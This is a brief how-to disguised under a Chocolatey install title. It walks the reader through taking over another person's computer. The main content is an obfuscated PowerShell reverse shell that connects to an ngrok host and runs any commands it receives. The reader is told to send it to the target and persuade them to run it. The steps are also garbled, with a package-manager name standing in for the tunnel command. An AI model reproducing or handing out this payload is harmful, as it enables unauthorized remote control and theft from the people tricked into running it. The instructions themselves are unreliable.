Install and set up Chocolatey on your PC

Run the server script:

Start by running the following Python code:

server.py

Open Command Prompt:

In the Command Prompt, type the following command:

tcp install chocolately
This will generate a 5-digit code.

Insert the code into the payload:

Replace YOUR_CODE in the following payload with the 5-digit code you received:

$client = New-O'b'ject System.Net.Sockets.TCPClient('0.tcp.in.ngrok.io',YOUR_CODE);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
Send the payload:

Share the edited payload with the person whose computer you want to access.

Ask them to run the payload:

Have the other person execute the payload using PowerShell.

Monitor the server:

Check the output of server.py to view the incoming connection and activity.

